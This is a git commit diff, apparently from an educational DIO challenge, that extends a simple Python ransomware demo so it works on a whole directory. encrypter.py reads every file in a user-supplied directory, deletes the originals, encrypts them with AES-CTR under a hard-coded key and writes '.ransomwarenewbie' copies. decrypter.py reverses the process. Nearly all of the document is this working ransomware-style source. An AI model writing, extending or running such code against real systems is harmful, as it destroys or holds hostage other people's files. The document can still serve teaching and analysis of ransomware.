6a366bc945cf1c36514b64fbff4b9b48798716b3
Zh0ny <caio.philipe.queiroz@gmail.com>
2024-12-18 02:14:03 -0300

    feat: Add directory input and support for multiple files encryption/decryption
    - Added input to specify target directory for encryption and decryption.
    - Updated classes to handle multiple files for both encryption and decryption.
    
    DIO CHALLENGE COMPLETED

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,30 @@
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+## abrir os arquivos a serem criptografados
+target_directory = input("insert target directory\n")
+archives_name = os.listdir(target_directory)
+archives = [os.path.join(target_directory, archive) for archive in archives_name if os.path.isfile(os.path.join(target_directory, archive))]
+files = [open(archive, "rb") for archive in archives]
+
+print(archives)
+
+files_data = [file.read() for file in files]
+
+for file in files: file.close()
 
 ## chave para descriptografia
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
-
+list_of_decrypt_data = []
+for file_data in files_data:
+    aes = pyaes.AESModeOfOperationCTR(key)
+    list_of_decrypt_data.append(aes.decrypt(file_data))
 ## remover o arquivo criptografado
-os.remove(file_name)
+for file in archives: os.remove(file)
 
 ## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
+new_files = [file_name.replace(".ransomwarenewbie","") for file_name in archives]
+new_files = [open(f'{file}','wb') for file in new_files] 
+for i,file in enumerate(new_files): 
+	file.write(list_of_decrypt_data[i])
+for file in new_files: file.close()
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,31 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+## abrir os arquivos a serem criptografados
+target_directory = input("insert target directory\n")
+archives_name = os.listdir(target_directory)
+archives = [os.path.join(target_directory, archive) for archive in archives_name if os.path.isfile(os.path.join(target_directory, archive))]
+files = [open(archive, "rb") for archive in archives]
+
+print(archives)
+
+files_data = [file.read() for file in files]
+for file in files: file.close()
 
 ## remover o arquivo
-os.remove(file_name)
+for file in archives: os.remove(file)
 
 ## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
 ## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+key = b"testeransomwares"
+list_of_crypto_data = []
+for file_data in files_data:
+    aes = pyaes.AESModeOfOperationCTR(key)
+    list_of_crypto_data.append(aes.encrypt(file_data))
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+new_files = [file_name + ".ransomwarenewbie" for file_name in archives]
+new_files = [open(f'{file}','wb') for file in new_files] 
+for i,file in enumerate(new_files): 
+	file.write(list_of_crypto_data[i])
+for file in new_files: file.close()
